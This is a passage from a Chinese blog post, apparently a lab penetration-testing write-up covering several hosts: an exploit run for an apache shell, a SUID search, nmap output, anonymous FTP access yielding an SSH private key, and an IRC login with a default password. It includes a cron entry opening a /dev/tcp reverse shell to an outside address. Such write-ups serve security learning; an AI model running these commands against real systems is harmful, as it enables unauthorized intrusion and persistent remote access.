+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./764 0x6a 192.168.100.166 443 -c 50</span><br></pre></td></tr></table></figure>
+
+<p>一次不行就多执行几次</p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmvhy6xma2j30u00w14ie.jpg" alt="image-20210121183329045"></p>
+<p>得到apache账户shell，经常断开</p>
+<p>find / -perm -u=s -type f 2&gt;/dev/null</p>
+<p>搜索suid程序</p>
+<p>发现可以执行/usr/bin/crontab</p>
+<p>赶紧写一个计划任务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim /tmp/a.cron</span><br><span class="line">* * * * * /bin/bash -i &gt;&amp; /dev/tcp/10.8.0.3/8888 0&gt;&amp;1</span><br><span class="line">:wq</span><br><span class="line">/usr/bin/crontab /tmp/a.cron</span><br></pre></td></tr></table></figure>
+
+<p>每分钟反弹一次shell</p>
+<p>linpeas无法执行，unix-privesc-check可以勉强运行</p>
+<p>但是没看出来有什么能提权的点，还是太菜了。。。</p>
+<hr>
+<h3 id="192-168-100-17"><a href="#192-168-100-17" class="headerlink" title="192.168.100.17"></a>192.168.100.17</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line">❯ nmap -sC -sV 192.168.100.17</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-22 10:20 CST</span><br><span class="line">Nmap scan report for 192.168.100.17</span><br><span class="line">Host is up (0.075s latency).</span><br><span class="line">Not shown: 986 closed ports</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">21/tcp   open  ftp         vsftpd 2.0.8 or later</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| -rw-r--r--    1 ftp      ftp        112640 Dec 28  2018 alternatives.tar.0</span><br><span class="line">| -rw-r--r--    1 ftp      ftp          4984 Dec 23  2018 alternatives.tar.1.gz</span><br><span class="line">| -rw-r--r--    1 ftp      ftp         95760 Dec 28  2018 apt.extended_states.0</span><br><span class="line">| -rw-r--r--    1 ftp      ftp         10513 Dec 27  2018 apt.extended_states.1.gz</span><br><span class="line">| -rw-r--r--    1 ftp      ftp         10437 Dec 26  2018 apt.extended_states.2.gz</span><br><span class="line">| -rw-r--r--    1 ftp      ftp           559 Dec 23  2018 dpkg.diversions.0</span><br><span class="line">| -rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.1.gz</span><br><span class="line">| -rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.2.gz</span><br><span class="line">| -rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.3.gz</span><br><span class="line">| -rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.4.gz</span><br><span class="line">| -rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.5.gz</span><br><span class="line">| -rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.6.gz</span><br><span class="line">| -rw-r--r--    1 ftp      ftp           505 Dec 28  2018 dpkg.statoverride.0</span><br><span class="line">| -rw-r--r--    1 ftp      ftp           295 Dec 28  2018 dpkg.statoverride.1.gz</span><br><span class="line">| -rw-r--r--    1 ftp      ftp           295 Dec 28  2018 dpkg.statoverride.2.gz</span><br><span class="line">| -rw-r--r--    1 ftp      ftp           295 Dec 28  2018 dpkg.statoverride.3.gz</span><br><span class="line">| -rw-r--r--    1 ftp      ftp           295 Dec 28  2018 dpkg.statoverride.4.gz</span><br><span class="line">| -rw-r--r--    1 ftp      ftp           295 Dec 28  2018 dpkg.statoverride.5.gz</span><br><span class="line">| -rw-r--r--    1 ftp      ftp           295 Dec 28  2018 dpkg.statoverride.6.gz</span><br><span class="line">| -rw-r--r--    1 ftp      ftp       1719127 Jan 01  2019 dpkg.status.0</span><br><span class="line">|_Only 20 shown. Use --script-args ftp-anon.maxlist=-1 to see all.</span><br><span class="line">| ftp-syst:</span><br><span class="line">|   STAT:</span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:172.24.191.129</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 2</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22/tcp   open  ssh         OpenSSH 7.4p1 Debian 10+deb9u4 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 84:c7:31:7a:21:7d:10:d3:a9:9c:73:c2:c2:2d:d6:77 (RSA)</span><br><span class="line">|_  256 66:c7:d0:be:8d:9d:9f:bf:78:67:d2:bc:cc:7d:33:b9 (ED25519)</span><br><span class="line">25/tcp   open  smtp        Postfix smtpd</span><br><span class="line">|_smtp-commands: TORMENT.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8,</span><br><span class="line">| ssl-cert: Subject: commonName=TORMENT</span><br><span class="line">| Subject Alternative Name: DNS:TORMENT</span><br><span class="line">| Not valid before: 2018-12-23T14:28:47</span><br><span class="line">|_Not valid after:  2028-12-20T14:28:47</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">53/tcp   open  domain?</span><br><span class="line">80/tcp   open  http        Apache httpd 2.4.25</span><br><span class="line">|_http-server-header: Apache/2.4.25</span><br><span class="line">|_http-title: Apache2 Debian Default Page: It works</span><br><span class="line">111/tcp  open  rpcbind     2-4 (RPC #100000)</span><br><span class="line">| rpcinfo:</span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111/udp6  rpcbind</span><br><span class="line">|   100003  3,4         2049/tcp   nfs</span><br><span class="line">|   100003  3,4         2049/tcp6  nfs</span><br><span class="line">|   100003  3,4         2049/udp   nfs</span><br><span class="line">|   100003  3,4         2049/udp6  nfs</span><br><span class="line">|   100005  1,2,3      34514/udp6  mountd</span><br><span class="line">|   100005  1,2,3      47603/udp   mountd</span><br><span class="line">|   100005  1,2,3      54413/tcp6  mountd</span><br><span class="line">|   100005  1,2,3      59783/tcp   mountd</span><br><span class="line">|   100021  1,3,4      32889/tcp6  nlockmgr</span><br><span class="line">|   100021  1,3,4      35801/udp   nlockmgr</span><br><span class="line">|   100021  1,3,4      39667/tcp   nlockmgr</span><br><span class="line">|   100021  1,3,4      49636/udp6  nlockmgr</span><br><span class="line">|   100227  3           2049/tcp   nfs_acl</span><br><span class="line">|   100227  3           2049/tcp6  nfs_acl</span><br><span class="line">|   100227  3           2049/udp   nfs_acl</span><br><span class="line">|_  100227  3           2049/udp6  nfs_acl</span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">143/tcp  open  imap        Dovecot imapd</span><br><span class="line">|_imap-capabilities: LITERAL+ more OK IMAP4rev1 listed AUTH=PLAIN have ENABLE LOGIN-REFERRALS AUTH=LOGINA0001 capabilities ID SASL-IR post-login Pre-login IDLE</span><br><span class="line">445/tcp  open  netbios-ssn Samba smbd 4.5.12-Debian (workgroup: WORKGROUP)</span><br><span class="line">631/tcp  open  ipp         CUPS 2.2</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: PUT</span><br><span class="line">|_http-server-header: CUPS/2.2 IPP/2.1</span><br><span class="line">|_http-title: Forbidden - CUPS v2.2.1</span><br><span class="line">2049/tcp open  nfs_acl     3 (RPC #100227)</span><br><span class="line">6667/tcp open  irc         ngircd</span><br><span class="line">6668/tcp open  irc         ngircd</span><br><span class="line">6669/tcp open  irc         ngircd</span><br><span class="line">Service Info: Hosts:  TORMENT.localdomain, TORMENT, irc.example.net; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: -15d19h43m18s, deviation: 4h37m06s, median: -15d17h03m19s</span><br><span class="line">|_nbstat: NetBIOS name: TORMENT, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| smb-os-discovery:</span><br><span class="line">|   OS: Windows 6.1 (Samba 4.5.12-Debian)</span><br><span class="line">|   Computer name: torment</span><br><span class="line">|   NetBIOS computer name: TORMENT\x00</span><br><span class="line">|   Domain name: \x00</span><br><span class="line">|   FQDN: torment</span><br><span class="line">|_  System time: 2021-01-06T17:17:12+08:00</span><br><span class="line">| smb-security-mode:</span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   2.02:</span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2021-01-06T09:17:11</span><br><span class="line">|_  start_date: N/A</span><br></pre></td></tr></table></figure>
+
+<p>ftp允许匿名登录，而后我们尝试ls、dir命令时提示</p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmwaqetwhrj30ey06kgnd.jpg" alt="image-20210122110922874"></p>
+<p>百度了下，因为ftp连接方式的问题，需要开启passive mode</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qinglingls/article/details/84929754">https://blog.csdn.net/qinglingls/article/details/84929754</a></p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmwasu6dxbj30zg0h0gxe.jpg" alt="image-20210122111142588"></p>
+<p>看到有很多隐藏文件，一个一个下载查看</p>
+<p>.ngircd 目录（irc服务）下有channels文件（突然兴奋</p>
+<p>.ssh下有私钥文件id_rsa</p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmwb7htbdvj31280iywr6.jpg" alt="image-20210122112548122"></p>
+<p>先下载ngircd，这里为了方便使用Textual7使用ngircd默认密码wealllikedebian登录聊天室</p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmwf3h9lsvj318g0s2tqd.jpg" alt="image-20210122134019738"></p>
+<p>在#tormentedprinter频道找到打印机密码？</p>
+<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmwf6y27vtj30rk07mn1d.jpg" alt="image-20210122134339965"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Fre4k5en</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://fre4k5en.me/2021/01/14/%E6%9F%90%E9%9D%B6%E5%9C%BAwriteup/">http://fre4k5en.me/2021/01/14/%E6%9F%90%E9%9D%B6%E5%9C%BAwriteup/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://fre4k5en.me" target="_blank">最后的家</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/LotusCMS/">LotusCMS</a><a class="post-meta__tags" href="/tags/mod-ssl/">mod_ssl</a></div><div class="post_share"><div class="social-share" data-image="https://tva1.sinaimg.cn/large/008eGmZEly1gmn8hgwzr1j30pm0pydne.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/01/22/time/"><img class="prev-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info"></div></div></a></div><div class="next-post pull-right"><a href="/2021/01/12/%E7%B3%BB%E7%BB%9F%E7%9B%B8%E5%85%B3/"><img class="next-cover" src="https://parrotsec.org/images/about/notebook.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">系统相关</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#192-168-100-187"><span class="toc-number">1.</span> <span class="toc-text">192.168.100.187</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Information-gathering"><span class="toc-number">1.1.</span> <span class="toc-text">Information gathering</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Enumeration-amp-getshell"><span class="toc-number">1.2.</span> <span class="toc-text">Enumeration &amp; getshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#User-shell"><span class="toc-number">1.3.</span> <span class="toc-text">User shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Root-shell"><span class="toc-number">1.4.</span> <span class="toc-text">Root shell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#192-168-100-175"><span class="toc-number">2.</span> <span class="toc-text">192.168.100.175</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#192-168-100-166"><span class="toc-number">3.</span> <span class="toc-text">192.168.100.166</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#192-168-100-17"><span class="toc-number">4.</span> <span class="toc-text">192.168.100.17</span></a></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By Fre4k5en</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
